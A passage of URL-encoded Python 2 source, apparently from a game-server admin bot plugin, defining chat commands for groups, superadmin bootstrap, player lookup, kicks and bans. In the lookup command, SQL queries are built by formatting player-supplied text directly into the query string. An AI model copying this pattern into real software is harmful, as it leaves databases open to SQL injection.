yword%20%3D%20m.groups()%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20Group(keyword%3Dkeyword)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.storage.getGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('group_unknown'%2C%20%7B'group_name'%3A%20keyword%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.inGroup(group)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.remGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7%25s%20%5E7removed%20from%20group%20%25s'%20%25%20(sclient.exactName%2C%20group.name))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7%25s%20%5E7is%20not%20in%20group%20%25s'%20%25%20(sclient.exactName%2C%20group.name))%0A%0A%20%20%20%20def%20cmd_iamgod(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20register%20yourself%20as%20the%20super%20admin%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20superadmins%20%3D%20self.console.clients.lookupSuperAdmins()%0A%20%20%20%20%20%20%20%20if%20len(superadmins)%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20There%20are%20already%20superadmins%2C%20disable%20this%20command%0A%20%20%20%20%20%20%20%20%20%20%20%20self.warning('%25s%20superadmin(s)%20found%20in%20db%3A%20disabling%20command'%20%25%20len(superadmins))%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20'iamgod'%20in%20self._commands%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self._commands.pop('iamgod')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20Group(keyword%3D'superadmin')%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.storage.getGroup(group)%0A%20%20%20%20%20%20%20%20except%20Exception%2C%20e%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error('could%20not%20get%20superadmin%20group%3A%20%25s'%2C%20e)%0A%20%20%20%20%20%20%20%20else%3A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20command%20%3D%20self._commands%5B'iamgod'%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error('iamgod%20command%20not%20found')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20False%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20command.level%20%3D%20'none'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20group%20in%20client.groups%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7You%20are%20already%20a%20%5E2%25s'%20%25%20group.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.setGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7You%20are%20now%20a%20%5E2%25s'%20%25%20group.name)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.bot('created%20%25s%20%25s%20-%20%25s'%2C%20group.name%2C%20client.name%2C%20client.guid)%0A%0A%20%20%20%20def%20cmd_time(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Ctimezone%2Foffset%3E%5D%20-%20display%20the%20servers%20current%20time%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('time'%2C%20self.console.formatTime(time.time()%2C%20data)))%0A%0A%20%20%20%20def%20cmd_seen(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20when%20was%20a%20player%20last%20seen%3F%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20clients%20%3D%20self.console.clients.lookupByName(m%5B0%5D)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20len(clients)%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('no_players'%2C%20m%5B0%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20c%20in%20clients%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('seen'%2C%20c.exactName%2C%20self.console.formatTime(c.timeEdit)))%0A%0A%20%20%20%20def%20cmd_lookup(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%2Fgrid%2Fguid%2Fuid%3E%20%3Cplayer%3E%20-%20lookup%20a%20player%20in%20the%20database%20by%20name%2Fgrid%2Fguid%2Fuid%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20self.console.storage.status()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Cannot%20lookup%3A%20database%20appears%20to%20be%20%5E1DOWN')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20if%20not%20m%5B1%5D%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E1ERROR%3A%20%5E7You%20must%20supply%20player%20info')%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20if%20m%5B0%5D%20%3D%3D%20'name'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20clients%20%3D%20self.console.clients.lookupByName(m%5B1%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20len(clients)%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('no_players'%2C%20m%5B1%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20c%20in%20clients%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('lookup_found'%2C%20c.id%2C%20c.exactName%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.formatTime(c.timeEdit)))%0A%0A%20%20%20%20%20%20%20%20elif%20m%5B0%5D%20%3D%3D%20'grid'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20gr%20%3D%20'GameRanger_Account_ID-000'%20%2B%20m%5B1%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20clients%20%3D%20self.console.storage.getClientsMatching(%7B'%25guid%25'%3A%20gr%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20len(clients)%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('no_players'%2C%20m%5B1%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20c%20in%20clients%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('lookup_found'%2C%20c.id%2C%20c.exactName%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.formatTime(c.timeEdit)))%0A%0A%20%20%20%20%20%20%20%20elif%20m%5B0%5D%20%3D%3D%20'guid'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cursor%20%3D%20self.console.storage.query(%22SELECT%20id%2C%20name%2C%20time_edit%2C%20guid%20FROM%20clients%20WHERE%20guid%20LIKE%20'%25%22%20%2B%20%22%25s'%22%20%25%20m%5B1%5D)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cursor.rowcount%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('no_players'%2C%20m%5B1%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20while%20not%20cursor.EOF%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20r%20%3D%20cursor.getRow()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('lookup_found'%2C%20r%5B'id'%5D%2C%20r%5B'name'%5D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.formatTime(r%5B'time_edit'%5D)))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cursor.moveNext()%0A%20%20%20%20%20%20%20%20%20%20%20%20cursor.close()%0A%0A%20%20%20%20%20%20%20%20elif%20m%5B0%5D%20%3D%3D%20'uid'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20m%5B1%5D%5B%3A1%5D%20%3D%3D%20'%40'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20uid%20%3D%20m%5B1%5D%5B-8%3A%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20uid%20%3D%20m%5B1%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20cursor%20%3D%20self.console.storage.query(%22SELECT%20*%20FROM%20clients%20WHERE%20pbid%20LIKE%20'%25%22%20%2B%20%22%25s'%22%20%25%20uid)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20cursor.rowcount%20%3D%3D%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('no_players'%2C%20m%5B1%5D))%0A%20%20%20%20%20%20%20%20%20%20%20%20while%20not%20cursor.EOF%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20r%20%3D%20cursor.getRow()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('lookup_found'%2C%20r%5B'id'%5D%2C%20r%5B'name'%5D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.formatTime(r%5B'time_edit'%5D)))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cursor.moveNext()%0A%20%20%20%20%20%20%20%20%20%20%20%20cursor.close()%0A%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%0A%20%20%20%20def%20cmd_status(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20report%20status%20of%20bot%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20self.console.storage.status()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Database%20appears%20to%20be%20%5E2UP')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Database%20appears%20to%20be%20%5E1DOWN')%0A%09%09%09%0A%20%20%20%20def%20cmd_scream(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cmessage%3E%20-%20yell%20a%20message%20to%20all%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20thread.start_new_thread(self.sayMany%2C%20(data%2C%205%2C%201))%0A%0A%20%20%20%20def%20cmd_find(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20-%20test%20to%20find%20a%20connected%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Found%20player%20matching%20%25s%20%5B%5E2%25s%5E7%5D%20%25s'%20%25%20(m%5B0%5D%2C%20sclient.cid%2C%20sclient.exactName))%0A%0A%20%20%20%20def%20cmd_clientinfo(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%3Cfield%3E%20-%20get%20info%20about%20a%20client%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data%2C%20True)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cid%2C%20field%20%3D%20m%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s%5E7%3A%20%25s%5E7%20is%20%25s'%20%25%20(sclient.exactName%2C%20field%2C%20getattr(sclient%2C%20field)))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20except%20AttributeError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Unrecognized%20field%20%25s'%20%25%20field)%0A%0A%20%20%20%20def%20cmd_kick(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%5B%3Creason%3E%5D%20-%20kick%20a%20player%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20msg%20%3D%20self.getMessage('invalid_parameters')%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(msg)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('kick_self'%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('action_denied_masked'%2C%20%7B'name'%3A%20sclient.exactName%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('kick_denied'%2C%20sclient.exactName%2C%20client.exactName%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.kick(reason%2C%20keyword%2C%20client)%0A%20%20%20%20%20%20%20%20elif%20re.match('%5E%5B0-9%5D%2B%24'%2C%20cid)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20failsafe%2C%20do%20a%20manual%20client%20id%20ban%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.kick(cid%2C%20reason%2C%20client)%0A%0A%20%20%20%20def%20cmd_kickall(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cpattern%3E%20%5B%3Creason%3E%5D%20-%20kick%20all%20players%20matching%20%3Cpattern%3E%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20matches%20%3D%20self.console.clients.getByMagic(cid)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20sclient%20in%20matches%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.kick(reason%2C%20keyword%2C%20client)%0A%0A%20%20%20%20def%20cmd_spank(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%5B%3Creason%3E%5D%20-%20spank%20a%20player%2C%20naughty%20boy!%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('kick_self'%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('action_denied_masked'%2C%20%7B'name'%3A%20sclient.exactName%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('kick_denied'%2C%20sclient.exactName%2C%20client.exactName%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20reason%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('spanked_reason'%2C%20sclient.exactName%2C%20client.exactName%2C%20reason))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('spanked'%2C%20sclient.exactName%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.kick(reason%2C%20keyword%2C%20client%2C%20silent%3DTrue)%0A%20%20%20%20%20%20%20%20elif%20re.match('%5E%5B0-9%5D%2B%24'%2C%20cid)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20failsafe%2C%20do%20a%20manual%20client%20id%20ban%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.kick(cid%2C%20reason%2C%20client)%0A%0A%20%20%20%20def%20cmd_spankall(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cpattern%3E%20%5B%3Creason%3E%5D%20-%20kick%20all%20players%20matching%20%3Cpattern%3E%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20matches%20%3D%20self.console.clients.getByMagic(cid)%0A%20%20%20%20%20%20%20%20for%20sclient%20in%20matches%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20reason%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('spanked_reason'%2C%20sclient.exactName%2C%20client.exactName%2C%20reason))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('spanked'%2C%20sclient.exactName%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.kick(reason%2C%20keyword%2C%20client%2C%20silent%3DTrue)%0A%0A%20%20%20%20def%20cmd_permban(self%2C%20data%2C%20client%3DNone%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cname%3E%20%5B%3Creason%3E%5D%20-%20ban%20a%20player%20permanently%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20cid%2C%20keyword%20%3D%20m%0A%20%20%20%20%20%20%20%20reason%20%3D%20self.getReason(keyword)%0A%0A%20%20%20%20%20%20%20%20if%20not%20reason%20and%20client.maxLevel%20%3C%20self._noreason_level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('error_no_reason'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(cid%2C%20client)%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.cid%20%3D%3D%20client.cid%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('ban_self'%2C%20client.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20sclient.maxLevel%20%3E%3D%20client.maxLevel%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient.maskGroup%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('action_denied_masked'%2C%20%7B'name'%3A%20sclient.exactName%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('ban_denied'%2C%20client.exactName%2C%20sclient.exactName))%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.groupBits%20%3D%200%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.ban(reason%2C%20keyword%2C%20client)%0A%0A%20%20%20%20%20%20%20%20elif%20re.match('%5E%5B0-9%5D%2B%